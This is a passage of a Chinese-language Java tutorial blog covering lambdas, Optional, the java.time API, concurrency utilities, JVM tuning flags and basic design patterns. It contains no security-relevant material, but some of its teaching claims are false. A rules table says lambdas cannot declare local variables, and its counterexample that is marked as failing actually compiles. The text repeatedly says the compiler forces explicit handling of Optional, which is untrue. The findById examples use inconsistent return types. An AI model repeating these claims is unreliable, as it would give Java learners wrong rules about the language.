过滤偶数，平方，求和</span></span><br><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> numbers.stream()</span><br><span class="line">    .filter(n -&gt; n % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">    .map(n -&gt; n * n)</span><br><span class="line">    .reduce(<span class="number">0</span>, Integer::sum);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 并行流处理（大数据量加速）</span></span><br><span class="line"><span class="type">int</span> <span class="variable">parallelSum</span> <span class="operator">=</span> numbers.parallelStream()</span><br><span class="line">    .mapToInt(n -&gt; n * n)</span><br><span class="line">    .sum();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="✅-场景-3：多参数-代码块"><a href="#✅-场景-3：多参数-代码块" class="headerlink" title="✅ 场景 3：多参数 + 代码块"></a>✅ <strong>场景 3：多参数 + 代码块</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 需要多行逻辑时用代码块</span></span><br><span class="line">Comparator&lt;Integer&gt; comparator = (a, b) -&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a &lt; b) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用法</span></span><br><span class="line">System.out.println(comparator.compare(<span class="number">3</span>, <span class="number">5</span>)); <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>

<h4 id="✅-场景-4：无参数（如-Runnable）"><a href="#✅-场景-4：无参数（如-Runnable）" class="headerlink" title="✅ 场景 4：无参数（如 Runnable）"></a>✅ <strong>场景 4：无参数（如 Runnable）</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建线程</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; System.out.println(<span class="string">&quot;Running&quot;</span>)).start();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等价于传统匿名内部类：</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).start();</span><br></pre></td></tr></table></figure>



<h3 id="关键注意事项"><a href="#关键注意事项" class="headerlink" title="关键注意事项"></a><strong>关键注意事项</strong></h3><table>
<thead>
<tr>
<th>规则</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><strong>必须是函数式接口</strong></td>
<td>Lambda 只能用于 <strong>只有一个抽象方法的接口</strong>（用 <code>@FunctionalInterface</code> 标注）</td>
<td><code>Runnable</code>, <code>Comparator</code>, <code>Predicate</code> 等</td>
</tr>
<tr>
<td><strong>访问外部变量必须是 final 或 effectively final</strong></td>
<td>Lambda 内部不能修改外部变量（只能读取）</td>
<td><code>int x = 10;</code><br><code>() -&gt; System.out.println(x); // ✅</code><br><code>x = 20; // ❌ 编译错误</code></td>
</tr>
<tr>
<td><strong>不能声明新变量</strong></td>
<td>Lambda 表达式中不能声明新变量（如 <code>int y = 5;</code>）</td>
<td><code>x -&gt; &#123; int y = x; return y; &#125; // ❌ 编译错误</code></td>
</tr>
<tr>
<td><strong>方法引用是 Lambda 的简写</strong></td>
<td>用 <code>::</code> 操作符引用已有方法</td>
<td><code>System.out::println</code> 等价于 <code>x -&gt; System.out.println(x)</code></td>
</tr>
</tbody></table>
<hr>
<h3 id="Lambda语法总结"><a href="#Lambda语法总结" class="headerlink" title="Lambda语法总结"></a><strong>Lambda语法总结</strong></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(参数列表) -&gt; &#123; 表达式或代码块 &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>参数列表</strong>：可省略类型，单参数省略括号  </li>
<li><strong>箭头 <code>-&gt;</code></strong>：固定符号  </li>
<li><strong>函数体</strong>：单行表达式省略 <code>&#123;&#125;</code> 和 <code>return</code></li>
</ul>
<h2 id="十一、Optional类使用"><a href="#十一、Optional类使用" class="headerlink" title="十一、Optional类使用"></a>十一、Optional类使用</h2><h3 id="Optional-类深度解析：彻底告别-NPE（空指针异常）"><a href="#Optional-类深度解析：彻底告别-NPE（空指针异常）" class="headerlink" title="Optional 类深度解析：彻底告别 NPE（空指针异常）"></a><strong><code>Optional</code> 类深度解析：彻底告别 NPE（空指针异常）</strong></h3><blockquote>
<p>✅ <strong>核心理念</strong>：<br><strong><code>Optional</code> 是 Java 8 引入的「容器类」，用于显式表达「值可能存在也可能不存在」</strong>，强制开发者处理空值场景，从根源上杜绝 <code>NullPointerException</code>。</p>
</blockquote>
<hr>
<h3 id="为什么需要-Optional？"><a href="#为什么需要-Optional？" class="headerlink" title="为什么需要 Optional？"></a><strong>为什么需要 <code>Optional</code>？</strong></h3><h4 id="传统空值处理的痛点"><a href="#传统空值处理的痛点" class="headerlink" title="传统空值处理的痛点"></a><strong>传统空值处理的痛点</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传统方式：到处写 null 检查，代码臃肿且易遗漏</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (user.getAddress() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (user.getAddress().getCity() != <span class="literal">null</span>) &#123;</span><br><span class="line">            name = user.getAddress().getCity().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>问题</strong>：  <ul>
<li>代码冗长、可读性差  </li>
<li>容易遗漏检查（导致运行时 NPE）  </li>
<li><strong>null 语义不明确</strong>：无法区分「故意为 null」还是「忘记处理」</li>
</ul>
</li>
</ul>
<h4 id="Optional-的解决方案"><a href="#Optional-的解决方案" class="headerlink" title="Optional 的解决方案"></a><strong><code>Optional</code> 的解决方案</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用 Optional 链式调用，语义清晰且安全</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> Optional.ofNullable(user)</span><br><span class="line">    .map(User::getAddress)</span><br><span class="line">    .map(Address::getCity)</span><br><span class="line">    .map(City::getName)</span><br><span class="line">    .orElse(<span class="string">&quot;未知城市&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>优势</strong>：  <ul>
<li><strong>强制处理空值</strong>：编译器要求你显式处理 <code>null</code> 场景  </li>
<li><strong>链式调用</strong>：避免多层嵌套 <code>if</code>  </li>
<li><strong>语义明确</strong>：<code>Optional</code> 本身表示「可能为空」，代码自解释</li>
</ul>
</li>
</ul>
<h3 id="Optional-核心方法"><a href="#Optional-核心方法" class="headerlink" title="Optional 核心方法"></a><strong><code>Optional</code> 核心方法</strong></h3><h4 id="1️⃣-创建-Optional-实例"><a href="#1️⃣-创建-Optional-实例" class="headerlink" title="1️⃣ 创建 Optional 实例"></a>1️⃣ <strong>创建 <code>Optional</code> 实例</strong></h4><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
<th>示例</th>
<th>适用场景</th>
</tr>
</thead>
<tbody><tr>
<td><code>Optional.of(T value)</code></td>
<td>包装非 null 值</td>
<td><code>Optional.of(&quot;Hello&quot;)</code></td>
<td><strong>值一定不为 null</strong>（否则抛 <code>NullPointerException</code>）</td>
</tr>
<tr>
<td><code>Optional.ofNullable(T value)</code></td>
<td>包装可能为 null 的值</td>
<td><code>Optional.ofNullable(user)</code></td>
<td><strong>值可能为 null</strong>（安全创建）</td>
</tr>
<tr>
<td><code>Optional.empty()</code></td>
<td>创建空 Optional</td>
<td><code>Optional.empty()</code></td>
<td>显式表示「无值」</td>
</tr>
</tbody></table>
<h4 id="2️⃣-安全获取值"><a href="#2️⃣-安全获取值" class="headerlink" title="2️⃣ 安全获取值"></a>2️⃣ <strong>安全获取值</strong></h4><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
<th>示例</th>
<th>风险</th>
</tr>
</thead>
<tbody><tr>
<td><code>T get()</code></td>
<td>直接获取值</td>
<td><code>optional.get()</code></td>
<td>⚠️ <strong>若为空则抛 <code>NoSuchElementException</code></strong>（不推荐！）</td>
</tr>
<tr>
<td><code>T orElse(T other)</code></td>
<td>有值返回值，无值返回默认值</td>
<td><code>optional.orElse(&quot;default&quot;)</code></td>
<td>安全（推荐）</td>
</tr>
<tr>
<td><code>T orElseGet(Supplier supplier)</code></td>
<td>有值返回值，无值执行 Supplier 生成默认值</td>
<td><code>optional.orElseGet(() -&gt; generateDefault())</code></td>
<td>延迟计算（默认值创建成本高时用）</td>
</tr>
<tr>
<td><code>T orElseThrow(Supplier exceptionSupplier)</code></td>
<td>有值返回值，无值抛异常</td>
<td><code>optional.orElseThrow(() -&gt; new CustomException())</code></td>
<td>需显式处理异常</td>
</tr>
</tbody></table>
<h4 id="3️⃣-转换值（避免嵌套）"><a href="#3️⃣-转换值（避免嵌套）" class="headerlink" title="3️⃣ 转换值（避免嵌套）"></a>3️⃣ <strong>转换值（避免嵌套）</strong></h4><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
<th>示例</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>Optional&lt;U&gt; map(Function mapper)</code></td>
<td>对值应用函数（返回新 Optional）</td>
<td><code>optional.map(String::toUpperCase)</code></td>
<td><strong>链式调用</strong>（如 <code>user.getAddress().getCity()</code>）</td>
</tr>
<tr>
<td><code>Optional&lt;U&gt; flatMap(Function mapper)</code></td>
<td>对值应用返回 Optional 的函数</td>
<td><code>optional.flatMap(User::getAddress)</code></td>
<td>值本身是 Optional 时使用</td>
</tr>
</tbody></table>
<h4 id="4️⃣-条件处理（无值-有值时操作）"><a href="#4️⃣-条件处理（无值-有值时操作）" class="headerlink" title="4️⃣ 条件处理（无值&#x2F;有值时操作）"></a>4️⃣ <strong>条件处理（无值&#x2F;有值时操作）</strong></h4><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
<th>示例</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>void ifPresent(Consumer consumer)</code></td>
<td>值存在时执行操作</td>
<td><code>optional.ifPresent(name -&gt; System.out.println(name))</code></td>
<td>仅需处理非空场景</td>
</tr>
<tr>
<td><code>void ifPresentOrElse(Consumer, Runnable)</code></td>
<td>有值执行 Consumer，无值执行 Runnable</td>
<td><code>optional.ifPresentOrElse(System.out::println, () -&gt; System.out.println(&quot;空值&quot;))</code></td>
<td>完整处理空&#x2F;非空场景</td>
</tr>
<tr>
<td><code>Optional&lt;T&gt; filter(Predicate predicate)</code></td>
<td>过滤值（不符合条件则变空）</td>
<td><code>optional.filter(name -&gt; name.length() &gt; 3)</code></td>
<td>验证值是否符合规则</td>
</tr>
</tbody></table>
<hr>
<h3 id="传统-vs-Optional"><a href="#传统-vs-Optional" class="headerlink" title="传统 vs Optional"></a><strong>传统 vs Optional</strong></h3><h4 id="场景-1：嵌套对象取值"><a href="#场景-1：嵌套对象取值" class="headerlink" title="场景 1：嵌套对象取值"></a><strong>场景 1：嵌套对象取值</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传统方式（易遗漏 null 检查）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">city</span> <span class="operator">=</span> <span class="string">&quot;未知&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (user != <span class="literal">null</span> &amp;&amp; user.getAddress() != <span class="literal">null</span> &amp;&amp; user.getAddress().getCity() != <span class="literal">null</span>) &#123;</span><br><span class="line">    city = user.getAddress().getCity().getName();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Optional 方式（编译器强制处理，安全简洁）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">city</span> <span class="operator">=</span> Optional.ofNullable(user)</span><br><span class="line">    .map(User::getAddress)</span><br><span class="line">    .map(Address::getCity)</span><br><span class="line">    .map(City::getName)</span><br><span class="line">    .orElse(<span class="string">&quot;未知&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="场景-2：从-Map-中安全取值"><a href="#场景-2：从-Map-中安全取值" class="headerlink" title="场景 2：从 Map 中安全取值"></a><strong>场景 2：从 Map 中安全取值</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, String&gt; config = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传统方式（需两次 null 检查）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (config != <span class="literal">null</span> &amp;&amp; config.get(<span class="string">&quot;timeout&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">    value = config.get(<span class="string">&quot;timeout&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Optional 方式（一行代码解决）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> Optional.ofNullable(config)</span><br><span class="line">    .map(map -&gt; map.get(<span class="string">&quot;timeout&quot;</span>))</span><br><span class="line">    .orElse(<span class="string">&quot;30s&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="场景-3：处理数据库查询结果（可能为空）"><a href="#场景-3：处理数据库查询结果（可能为空）" class="headerlink" title="场景 3：处理数据库查询结果（可能为空）"></a><strong>场景 3：处理数据库查询结果（可能为空）</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传统方式（冗长且易错）</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userRepository.findById(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 处理 user</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 处理空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Optional 方式（语义清晰）</span></span><br><span class="line">Optional&lt;User&gt; userOpt = userRepository.findById(<span class="number">100</span>);</span><br><span class="line">userOpt.ifPresent(user -&gt; &#123;</span><br><span class="line">    <span class="comment">// 处理 user</span></span><br><span class="line">&#125;);</span><br><span class="line">userOpt.orElseThrow(() -&gt; <span class="keyword">new</span> <span class="title class_">UserNotFoundException</span>(<span class="string">&quot;ID 100 不存在&quot;</span>));</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Optional-使用规则"><a href="#Optional-使用规则" class="headerlink" title="Optional 使用规则"></a><strong><code>Optional</code> 使用规则</strong></h3><table>
<thead>
<tr>
<th>误区</th>
<th>正确做法</th>
<th>原因</th>
</tr>
</thead>
<tbody><tr>
<td>❌ 用 <code>Optional</code> 作为类的成员变量</td>
<td>✅ <strong>仅用于方法返回值</strong></td>
<td><code>Optional</code> 不可序列化，且违背设计初衷（字段应明确表示是否可空）</td>
</tr>
<tr>
<td>❌ 使用 <code>optional.get()</code></td>
<td>✅ <strong>永远用 <code>orElse</code>&#x2F;<code>orElseGet</code>&#x2F;<code>orElseThrow</code></strong></td>
<td><code>get()</code> 会抛异常，和直接用 <code>null</code> 无区别</td>
</tr>
<tr>
<td>❌ 用 <code>Optional</code> 包装集合</td>
<td>✅ <strong>集合返回空集合（<code>Collections.emptyList()</code>）</strong></td>
<td>集合的空值语义应由空集合表示，而非 <code>Optional</code></td>
</tr>
<tr>
<td>❌ 用 <code>Optional</code> 替代基础类型判断</td>
<td>✅ <strong>用基本类型特化版本（<code>OptionalInt</code>&#x2F;<code>OptionalDouble</code>）</strong></td>
<td>基本类型包装会损失性能（<code>OptionalInt</code> 无装箱开销）</td>
</tr>
</tbody></table>
<blockquote>
<p>💡 <strong>关键原则</strong>：<br><strong><code>Optional</code> 是方法返回值的「语义增强器」，不是 null 的替代品！</strong>  </p>
<ul>
<li><strong>方法返回 <code>Optional&lt;T&gt;</code></strong> → 明确告诉调用者：「这个值可能为空」  </li>
<li><strong>方法返回 <code>T</code></strong> → 明确告诉调用者：「这个值一定不为空」</li>
</ul>
</blockquote>
<h3 id="使用事例"><a href="#使用事例" class="headerlink" title="使用事例"></a><strong>使用事例</strong></h3><h4 id="正确使用场景"><a href="#正确使用场景" class="headerlink" title="正确使用场景"></a><strong>正确使用场景</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法返回 Optional（明确表示可能为空）</span></span><br><span class="line"><span class="keyword">public</span> Optional&lt;User&gt; <span class="title function_">findUserById</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userRepository.findById(id);</span><br><span class="line">    <span class="keyword">return</span> Optional.ofNullable(user); <span class="comment">// 显式表示可能为空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用方安全处理</span></span><br><span class="line">Optional&lt;User&gt; userOpt = findUserById(<span class="number">100</span>);</span><br><span class="line">userOpt.ifPresent(user -&gt; &#123;</span><br><span class="line">    <span class="comment">// 处理 user</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="链式调用示例"><a href="#链式调用示例" class="headerlink" title="链式调用示例"></a><strong>链式调用示例</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从配置中获取用户默认语言（可能为空）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">lang</span> <span class="operator">=</span> Optional.ofNullable(config)</span><br><span class="line">    .map(c -&gt; c.get(<span class="string">&quot;language&quot;</span>))</span><br><span class="line">    .filter(s -&gt; !s.isEmpty())</span><br><span class="line">    .orElse(<span class="string">&quot;zh-CN&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从订单中获取最后修改时间（可能为空）</span></span><br><span class="line"><span class="type">LocalDateTime</span> <span class="variable">time</span> <span class="operator">=</span> Optional.ofNullable(order)</span><br><span class="line">    .map(Order::getModifiedTime)</span><br><span class="line">    .orElse(LocalDateTime.now());</span><br></pre></td></tr></table></figure>

<h4 id="避免过度使用"><a href="#避免过度使用" class="headerlink" title="避免过度使用"></a><strong>避免过度使用</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 错误示范：用 Optional 包装非空字段</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Optional&lt;String&gt; name; <span class="comment">// 不要这样！</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确做法：字段用 null 表示空，方法返回 Optional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name; <span class="comment">// 允许为 null</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Optional&lt;String&gt; <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Optional.ofNullable(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><table>
<thead>
<tr>
<th>传统代码</th>
<th><code>Optional</code> 代码</th>
<th>本质差异</th>
</tr>
</thead>
<tbody><tr>
<td><code>String name = user.getName();</code></td>
<td><code>String name = Optional.ofNullable(user).map(User::getName).orElse(&quot;Unknown&quot;);</code></td>
<td><strong>强制显式处理空值</strong>：编译器要求你写 <code>orElse</code>&#x2F;<code>ifPresent</code> 等，否则无法编译通过</td>
</tr>
<tr>
<td><code>if (user != null) &#123; ... &#125;</code></td>
<td><code>userOpt.ifPresent(u -&gt; &#123; ... &#125;);</code></td>
<td><strong>代码结构明确</strong>：<code>ifPresent</code> 语义清晰，避免嵌套 <code>if</code></td>
</tr>
</tbody></table>
<h2 id="十二、Java-8-新特性详解"><a href="#十二、Java-8-新特性详解" class="headerlink" title="十二、Java 8+ 新特性详解"></a>十二、Java 8+ 新特性详解</h2><h3 id="1-日期时间API（java-time）"><a href="#1-日期时间API（java-time）" class="headerlink" title="1. 日期时间API（java.time）"></a>1. 日期时间API（java.time）</h3><ul>
<li><p><strong>核心类</strong>：</p>
<table>
<thead>
<tr>
<th>类</th>
<th>用途</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>LocalDate</code></td>
<td>日期（年月日）</td>
<td><code>LocalDate.now()</code></td>
</tr>
<tr>
<td><code>LocalTime</code></td>
<td>时间（时分秒）</td>
<td><code>LocalTime.of(10, 30)</code></td>
</tr>
<tr>
<td><code>LocalDateTime</code></td>
<td>日期+时间</td>
<td><code>LocalDateTime.now()</code></td>
</tr>
<tr>
<td><code>ZonedDateTime</code></td>
<td>带时区的日期时间</td>
<td><code>ZonedDateTime.now(ZoneId.of(&quot;Asia/Shanghai&quot;))</code></td>
</tr>
<tr>
<td><code>Duration</code></td>
<td>时间段（秒&#x2F;纳秒）</td>
<td><code>Duration.between(start, end)</code></td>
</tr>
<tr>
<td><code>Period</code></td>
<td>日期段（年月日）</td>
<td><code>Period.between(date1, date2)</code></td>
</tr>
</tbody></table>
</li>
<li><p><strong>日期时间格式化</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">DateTimeFormatter</span> <span class="variable">formatter</span> <span class="operator">=</span> DateTimeFormatter.ofPattern(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="type">LocalDateTime</span> <span class="variable">now</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line"><span class="type">String</span> <span class="variable">formatted</span> <span class="operator">=</span> now.format(formatter);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-并发工具类"><a href="#2-并发工具类" class="headerlink" title="2. 并发工具类"></a>2. 并发工具类</h3><ul>
<li><p><strong>CompletableFuture</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Result&quot;</span>;</span><br><span class="line">&#125;).thenApply(result -&gt; result.toUpperCase())</span><br><span class="line"> .thenAccept(System.out::println);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>StampedLock</strong>（读写锁优化）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">StampedLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StampedLock</span>();</span><br><span class="line"><span class="type">long</span> <span class="variable">stamp</span> <span class="operator">=</span> lock.readLock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 读操作</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    lock.unlockRead(stamp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="十三、JVM性能调优关键点"><a href="#十三、JVM性能调优关键点" class="headerlink" title="十三、JVM性能调优关键点"></a>十三、JVM性能调优关键点</h2><h3 id="1-内存参数配置"><a href="#1-内存参数配置" class="headerlink" title="1. 内存参数配置"></a>1. 内存参数配置</h3><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>-Xms</code></td>
<td>初始堆大小</td>
<td><code>-Xms512m</code></td>
</tr>
<tr>
<td><code>-Xmx</code></td>
<td>最大堆大小</td>
<td><code>-Xmx2g</code></td>
</tr>
<tr>
<td><code>-XX:NewRatio</code></td>
<td>新生代&#x2F;老年代比例</td>
<td><code>-XX:NewRatio=2</code></td>
</tr>
<tr>
<td><code>-XX:MaxMetaspaceSize</code></td>
<td>元空间最大大小</td>
<td><code>-XX:MaxMetaspaceSize=256m</code></td>
</tr>
<tr>
<td><code>-XX:+UseG1GC</code></td>
<td>启用G1垃圾回收器</td>
<td><code>-XX:+UseG1GC</code></td>
</tr>
</tbody></table>
<h3 id="2-常见内存问题诊断"><a href="#2-常见内存问题诊断" class="headerlink" title="2. 常见内存问题诊断"></a>2. 常见内存问题诊断</h3><ul>
<li><p><strong>OutOfMemoryError</strong>：</p>
<ul>
<li><strong>堆内存溢出</strong>：<code>java.lang.OutOfMemoryError: Java heap space</code><ul>
<li>解决：增大<code>-Xmx</code>，检查内存泄漏</li>
</ul>
</li>
<li><strong>元空间溢出</strong>：<code>java.lang.OutOfMemoryError: Metaspace</code><ul>
<li>解决：增大<code>-XX:MaxMetaspaceSize</code></li>
</ul>
</li>
<li><strong>栈溢出</strong>：<code>java.lang.StackOverflowError</code><ul>
<li>解决：增大<code>-Xss</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>内存泄漏诊断工具</strong>：</p>
<ul>
<li><code>jmap -heap &lt;pid&gt;</code>：查看堆内存使用</li>
<li><code>jstat -gc &lt;pid&gt; 1000</code>：实时监控GC情况</li>
<li><code>jvisualvm</code>：图形化分析内存快照</li>
</ul>
</li>
</ul>
<h2 id="十四、设计模式的应用"><a href="#十四、设计模式的应用" class="headerlink" title="十四、设计模式的应用"></a>十四、设计模式的应用</h2><h3 id="1-单例模式（双重检查锁）"><a href="#1-单例模式（双重检查锁）" class="headerlink" title="1. 单例模式（双重检查锁）"></a>1. 单例模式（双重检查锁）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-工厂模式（简单工厂）"><a href="#2-工厂模式（简单工厂）" class="headerlink" title="2. 工厂模式（简单工厂）"></a>2. 工厂模式（简单工厂）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123; System.out.println(<span class="string">&quot;Circle&quot;</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShapeFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Shape <span class="title function_">getShape</span><span class="params">(String type)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;circle&quot;</span>.equals(type)) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Circle</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;rectangle&quot;</span>.equals(type)) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-观察者模式（Java内置实现）"><a href="#3-观察者模式（Java内置实现）" class="headerlink" title="3. 观察者模式（Java内置实现）"></a>3. 观察者模式（Java内置实现）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Observable;</span><br><span class="line"><span class="keyword">import</span> java.util.Observer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Subject</span> <span class="keyword">extends</span> <span class="title class_">Observable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> state;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setState</span><span class="params">(<span class="type">int</span> state)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.state = state;</span><br><span class="line">        setChanged(); <span class="comment">// 标记已更改</span></span><br><span class="line">        notifyObservers(state); <span class="comment">// 通知所有观察者</span></span><br><span class="line">    &#125;</span><br><span 